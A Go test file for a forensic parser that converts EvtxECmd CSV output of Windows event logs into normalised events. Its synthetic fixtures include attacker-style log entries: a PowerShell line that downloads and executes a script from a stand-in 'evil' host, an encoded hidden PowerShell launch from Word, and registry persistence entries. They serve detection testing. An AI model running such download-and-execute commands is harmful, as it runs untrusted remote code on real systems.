package evtxcsv

import (
	"os"
	"path/filepath"
	"testing"

	"tracefall/internal/model"
)

func TestDetect(t *testing.T) {
	p := New()
	cases := map[string]bool{
		"EvtxECmd/20260115_EvtxECmd_Output.csv": true,
		"evtxecmd_output.CSV":                   true,
		"PECmd/20260115_PECmd_Output.csv":       false,
		"EvtxECmd/readme.txt":                   false,
	}
	for path, want := range cases {
		if got := p.Detect(path); got != want {
			t.Errorf("Detect(%q) = %v, want %v", path, got, want)
		}
	}
}

const sampleCSV = `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:00:00.0000000Z,4624,Microsoft-Windows-Security-Auditing,Security,WKSTN-042,jdoe,-,Logon Success,"TargetUserName: jdoe; LogonType: 2; IpAddress: 127.0.0.1",,,,,,1
2026-01-15T09:14:47.0000000Z,4688,Microsoft-Windows-Security-Auditing,Security,WKSTN-042,,-,Process Create,"NewProcessId: 0x1F30; NewProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; ParentProcessName: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE; ProcessId: 0x1A2C; CommandLine: powershell.exe -enc AAAA; SubjectUserName: jdoe",,,,,,2
2026-01-15T09:14:48.0000000Z,4104,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,WKSTN-042,jdoe,-,Script Block,"ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1'); ScriptBlockId: abc-123",,,,,,3
2026-01-15T09:18:05.0000000Z,3,Sysmon,Microsoft-Windows-Sysmon/Operational,WKSTN-042,jdoe,203.0.113.77,Network Connect,"Image: C:\Temp\update.exe; SourceIp: 10.0.0.5; DestinationIp: 203.0.113.77; DestinationPort: 443; ProcessId: 8260",,,,,,4
`

func writeTemp(t *testing.T, name, content string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestParse(t *testing.T) {
	path := writeTemp(t, "20260115_EvtxECmd_Output.csv", sampleCSV)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 4 {
		t.Fatalf("got %d events, want 4", len(res.Events))
	}
	if len(res.Raw) != len(res.Events) {
		t.Fatalf("got %d raw records, want %d", len(res.Raw), len(res.Events))
	}

	logon := res.Events[0]
	if logon.EventType != model.EventLogonSuccess {
		t.Errorf("event 0 type = %q, want %q", logon.EventType, model.EventLogonSuccess)
	}
	if logon.User != "jdoe" {
		t.Errorf("event 0 user = %q, want jdoe", logon.User)
	}
	if logon.Extra["logon_type"] != "2" {
		t.Errorf("event 0 logon_type = %q, want 2", logon.Extra["logon_type"])
	}

	proc := res.Events[1]
	if proc.EventType != model.EventProcessCreate {
		t.Errorf("event 1 type = %q, want %q", proc.EventType, model.EventProcessCreate)
	}
	if proc.ProcessName != "powershell.exe" {
		t.Errorf("event 1 process_name = %q, want powershell.exe (regression: space-containing parent path must not truncate ProcessName)", proc.ProcessName)
	}
	if proc.ParentProcessName != "winword.exe" {
		t.Errorf("event 1 parent_process = %q, want winword.exe", proc.ParentProcessName)
	}
	if proc.PID != 7984 { // 0x1F30
		t.Errorf("event 1 pid = %d, want 7984", proc.PID)
	}
	if proc.PPID != 6700 { // 0x1A2C
		t.Errorf("event 1 ppid = %d, want 6700", proc.PPID)
	}

	script := res.Events[2]
	if script.EventType != model.EventPowerShellScript {
		t.Errorf("event 2 type = %q, want %q", script.EventType, model.EventPowerShellScript)
	}

	net := res.Events[3]
	if net.EventType != model.EventNetworkConnection {
		t.Errorf("event 3 type = %q, want %q", net.EventType, model.EventNetworkConnection)
	}
	if net.NetworkDest != "203.0.113.77" {
		t.Errorf("event 3 network_dest = %q, want 203.0.113.77", net.NetworkDest)
	}
}

// ---------------- Phase 4: new Security/System/Sysmon coverage ----------------

func TestParse_Phase4AuthenticationEvents(t *testing.T) {
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:20:00.0000000Z,4648,Microsoft-Windows-Security-Auditing,Security,WKSTN-042,,-,Explicit Creds,"SubjectUserName: jdoe; TargetUserName: svc-backup; TargetServerName: FILESRV01; IpAddress: 10.0.0.5; ProcessName: C:\Windows\System32\cmd.exe",,,,,,1
2026-01-15T09:20:05.0000000Z,4672,Microsoft-Windows-Security-Auditing,Security,WKSTN-042,,-,Special Privileges,"SubjectUserName: svc-backup; PrivilegeList: SeDebugPrivilege SeBackupPrivilege",,,,,,2
2026-01-15T09:20:10.0000000Z,4768,Microsoft-Windows-Security-Auditing,Security,DC01,,-,TGT Request,"TargetUserName: jdoe; IpAddress: 10.0.0.9; TicketEncryptionType: 0x12",,,,,,3
2026-01-15T09:20:15.0000000Z,4769,Microsoft-Windows-Security-Auditing,Security,DC01,,-,Service Ticket,"TargetUserName: jdoe; ServiceName: FILESRV01$; TicketEncryptionType: 0x12",,,,,,4
2026-01-15T09:20:20.0000000Z,4776,Microsoft-Windows-Security-Auditing,Security,DC01,,-,NTLM,"TargetUserName: jdoe; Workstation: WKSTN-042; ErrorCode: 0x0",,,,,,5
`
	path := writeTemp(t, "phase4auth_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 5 {
		t.Fatalf("got %d events, want 5", len(res.Events))
	}

	explicit := res.Events[0]
	if explicit.EventType != model.EventLogonExplicitCreds {
		t.Errorf("event 0 type = %q, want %q", explicit.EventType, model.EventLogonExplicitCreds)
	}
	if explicit.Extra["target_user_name"] != "svc-backup" {
		t.Errorf("event 0 target_user_name = %q, want svc-backup", explicit.Extra["target_user_name"])
	}
	if explicit.ProcessName != "cmd.exe" {
		t.Errorf("event 0 process_name = %q, want cmd.exe", explicit.ProcessName)
	}

	priv := res.Events[1]
	if priv.EventType != model.EventPrivilegedLogon {
		t.Errorf("event 1 type = %q, want %q", priv.EventType, model.EventPrivilegedLogon)
	}
	if priv.User != "svc-backup" {
		t.Errorf("event 1 user = %q, want svc-backup", priv.User)
	}

	tgt := res.Events[2]
	if tgt.EventType != model.EventKerberosTGTRequest {
		t.Errorf("event 2 type = %q, want %q", tgt.EventType, model.EventKerberosTGTRequest)
	}

	tgs := res.Events[3]
	if tgs.EventType != model.EventKerberosServiceTicket {
		t.Errorf("event 3 type = %q, want %q", tgs.EventType, model.EventKerberosServiceTicket)
	}
	if tgs.Extra["service_name"] != "FILESRV01$" {
		t.Errorf("event 3 service_name = %q, want FILESRV01$", tgs.Extra["service_name"])
	}

	ntlm := res.Events[4]
	if ntlm.EventType != model.EventNTLMAuth {
		t.Errorf("event 4 type = %q, want %q", ntlm.EventType, model.EventNTLMAuth)
	}
}

func TestParse_Phase4PowerShellModuleLogging(t *testing.T) {
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:14:47.0000000Z,4103,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,WKSTN-042,jdoe,-,Module Logging,"Payload: Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://evil/x.ps1'); ContextInfo: some context",,,,,,1
`
	path := writeTemp(t, "phase4psmodule_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 1 {
		t.Fatalf("got %d events, want 1", len(res.Events))
	}
	ev := res.Events[0]
	if ev.EventType != model.EventPowerShellScript {
		t.Errorf("type = %q, want %q", ev.EventType, model.EventPowerShellScript)
	}
	if ev.Extra["log_type"] != "module_logging" {
		t.Errorf("log_type = %q, want module_logging", ev.Extra["log_type"])
	}
	if ev.CommandLine == "" {
		t.Error("expected non-empty command line from Payload field")
	}
}

func TestParse_Phase4ServiceInstall(t *testing.T) {
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:22:00.0000000Z,7045,Service Control Manager,System,WKSTN-042,,-,Service Installed,"ServiceName: WeirdUpdateSvc; ImagePath: C:\Users\Public\svc.exe; StartType: auto start; ServiceType: user mode service; AccountName: LocalSystem",,,,,,1
`
	path := writeTemp(t, "phase4service_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 1 {
		t.Fatalf("got %d events, want 1", len(res.Events))
	}
	ev := res.Events[0]
	if ev.EventType != model.EventServiceInstall {
		t.Errorf("type = %q, want %q", ev.EventType, model.EventServiceInstall)
	}
	if ev.Extra["service_name"] != "WeirdUpdateSvc" {
		t.Errorf("service_name = %q, want WeirdUpdateSvc", ev.Extra["service_name"])
	}
	if ev.ProcessName != "svc.exe" {
		t.Errorf("process_name = %q, want svc.exe", ev.ProcessName)
	}
}

// A 7045 record on a channel/provider Tracefall doesn't recognize (e.g. a
// plain "System" event from some other provider using the same ID) must
// not be misclassified as a service install -- EventID alone is never
// sufficient, channel+provider must both match.
func TestParse_UnrelatedSystemEventIDNotMisclassified(t *testing.T) {
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:22:00.0000000Z,7045,Microsoft-Windows-Kernel-General,System,WKSTN-042,,-,Unrelated,"SomeField: value",,,,,,1
`
	path := writeTemp(t, "unrelated7045_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 0 {
		t.Fatalf("got %d events, want 0 (wrong provider for 7045 must not match)", len(res.Events))
	}
}

func TestParse_Phase4SysmonProcessCreate(t *testing.T) {
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:14:47.0000000Z,1,Sysmon,Microsoft-Windows-Sysmon/Operational,WKSTN-042,jdoe,-,Process Create,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; CommandLine: powershell.exe -nop -w hidden -enc AAAA; ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE; ParentCommandLine: WINWORD.EXE /n doc.docm; ProcessId: 8080; ParentProcessId: 6700; User: CORP\jdoe; IntegrityLevel: Medium; OriginalFileName: PowerShell.EXE",,,,,,1
`
	path := writeTemp(t, "phase4sysmon1_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 1 {
		t.Fatalf("got %d events, want 1", len(res.Events))
	}
	ev := res.Events[0]
	if ev.EventType != model.EventProcessCreate {
		t.Errorf("type = %q, want %q (Sysmon process-create normalizes to the same type as 4688)", ev.EventType, model.EventProcessCreate)
	}
	if ev.ProcessName != "powershell.exe" || ev.ParentProcessName != "winword.exe" {
		t.Errorf("process/parent = %q/%q, want powershell.exe/winword.exe", ev.ProcessName, ev.ParentProcessName)
	}
	if ev.PID != 8080 || ev.PPID != 6700 {
		t.Errorf("pid/ppid = %d/%d, want 8080/6700", ev.PID, ev.PPID)
	}
	if ev.Extra["integrity_level"] != "Medium" {
		t.Errorf("integrity_level = %q, want Medium", ev.Extra["integrity_level"])
	}
	if ev.Extra["parent_command_line"] == "" {
		t.Error("expected non-empty parent_command_line")
	}
}

func TestParse_Phase4SysmonNetworkConnectPopulatesDestPort(t *testing.T) {
	// Regression: NetworkDestPort (the typed int field) must actually be
	// populated, not just stashed as a string in Extra -- Phase 4's
	// networkAfterExecution/detection needs the real field.
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:18:05.0000000Z,3,Sysmon,Microsoft-Windows-Sysmon/Operational,WKSTN-042,jdoe,203.0.113.77,Network Connect,"Image: C:\Temp\update.exe; SourceIp: 10.0.0.5; DestinationIp: 203.0.113.77; DestinationPort: 443; ProcessId: 8260",,,,,,1
`
	path := writeTemp(t, "phase4sysmon3_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 1 {
		t.Fatalf("got %d events, want 1", len(res.Events))
	}
	if res.Events[0].NetworkDestPort != 443 {
		t.Errorf("network_dest_port = %d, want 443", res.Events[0].NetworkDestPort)
	}
}

func TestParse_Phase4SysmonFileCreate(t *testing.T) {
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:15:00.0000000Z,11,Sysmon,Microsoft-Windows-Sysmon/Operational,WKSTN-042,jdoe,-,File Create,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename: C:\Users\jdoe\AppData\Local\Temp\update.exe; ProcessId: 8080",,,,,,1
`
	path := writeTemp(t, "phase4sysmon11_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 1 {
		t.Fatalf("got %d events, want 1", len(res.Events))
	}
	ev := res.Events[0]
	if ev.EventType != model.EventFileCreate {
		t.Errorf("type = %q, want %q", ev.EventType, model.EventFileCreate)
	}
	if ev.FilePath != `C:\Users\jdoe\AppData\Local\Temp\update.exe` {
		t.Errorf("file_path = %q", ev.FilePath)
	}
}

func TestParse_Phase4SysmonRegistryEvent(t *testing.T) {
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:16:00.0000000Z,13,Sysmon,Microsoft-Windows-Sysmon/Operational,WKSTN-042,jdoe,-,Registry Set,"TargetObject: HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\Updater; Details: C:\Users\jdoe\AppData\Local\Temp\update.exe; Image: C:\Windows\regedit.exe; ProcessId: 4000",,,,,,1
2026-01-15T09:16:05.0000000Z,13,Sysmon,Microsoft-Windows-Sysmon/Operational,WKSTN-042,jdoe,-,Registry Set,"TargetObject: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell; Details: explorer.exe, C:\Users\Public\bad.exe; Image: C:\Windows\regedit.exe; ProcessId: 4000",,,,,,2
2026-01-15T09:16:10.0000000Z,13,Sysmon,Microsoft-Windows-Sysmon/Operational,WKSTN-042,jdoe,-,Registry Set,"TargetObject: HKLM\Software\SomeApp\Settings\LastRun; Details: 1; Image: C:\Windows\regedit.exe; ProcessId: 4000",,,,,,3
`
	path := writeTemp(t, "phase4sysmon13_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 2 {
		t.Fatalf("got %d events, want 2 (the unrecognized, non-persistence key must be dropped)", len(res.Events))
	}
	runKey := res.Events[0]
	if runKey.EventType != model.EventRegistryRunKey {
		t.Errorf("event 0 type = %q, want %q", runKey.EventType, model.EventRegistryRunKey)
	}
	winlogon := res.Events[1]
	if winlogon.EventType != model.EventRegistryPersistence {
		t.Errorf("event 1 type = %q, want %q", winlogon.EventType, model.EventRegistryPersistence)
	}
	if winlogon.Extra["registry_persistence_type"] != "winlogon" {
		t.Errorf("registry_persistence_type = %q, want winlogon", winlogon.Extra["registry_persistence_type"])
	}
}

func TestParse_Phase4SysmonDNSQuery(t *testing.T) {
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:17:00.0000000Z,22,Sysmon,Microsoft-Windows-Sysmon/Operational,WKSTN-042,jdoe,-,DNS Query,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; QueryName: evil.example.com; QueryStatus: 0; ProcessId: 8080",,,,,,1
`
	path := writeTemp(t, "phase4sysmon22_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 1 {
		t.Fatalf("got %d events, want 1", len(res.Events))
	}
	ev := res.Events[0]
	if ev.EventType != model.EventDNSQuery {
		t.Errorf("type = %q, want %q", ev.EventType, model.EventDNSQuery)
	}
	if ev.NetworkDest != "evil.example.com" {
		t.Errorf("network_dest = %q, want evil.example.com", ev.NetworkDest)
	}
}

// Malformed/missing-field/empty-input robustness -- Phase 4H requires
// this for every new parser path, mirroring TestParseUnknownEventIDSkipped
// and TestParseMissingTimestampSkipsRow's existing coverage below.
func TestParse_Phase4MissingFieldsDoNotCrash(t *testing.T) {
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:20:00.0000000Z,4648,Microsoft-Windows-Security-Auditing,Security,WKSTN-042,,-,Explicit Creds,,,,,,,1
2026-01-15T09:22:00.0000000Z,7045,Service Control Manager,System,WKSTN-042,,-,Service Installed,,,,,,,2
2026-01-15T09:16:00.0000000Z,13,Sysmon,Microsoft-Windows-Sysmon/Operational,WKSTN-042,jdoe,-,Registry Set,"TargetObject: ",,,,,,3
`
	path := writeTemp(t, "phase4missing_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse must not error on missing/empty payload fields: %v", err)
	}
	// 4648 and 7045 with empty payloads still produce an event (a
	// minimally-populated one, since the row's own timestamp/channel/ID
	// are all that's structurally required); the row 3 registry event
	// with an empty TargetObject classifies to KindNone and is dropped.
	if len(res.Events) != 2 {
		t.Fatalf("got %d events, want 2", len(res.Events))
	}
}

func TestParseEmptyInput(t *testing.T) {
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
`
	path := writeTemp(t, "empty_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 0 {
		t.Fatalf("got %d events for header-only input, want 0", len(res.Events))
	}
}

func TestParseUnknownEventIDSkipped(t *testing.T) {
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:00:00.0000000Z,9999,Microsoft-Windows-Security-Auditing,Security,WKSTN-042,jdoe,-,Unknown Event,,,,,,,1
`
	path := writeTemp(t, "unknown_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 0 {
		t.Fatalf("got %d events for an unmapped channel/EventId, want 0", len(res.Events))
	}
}
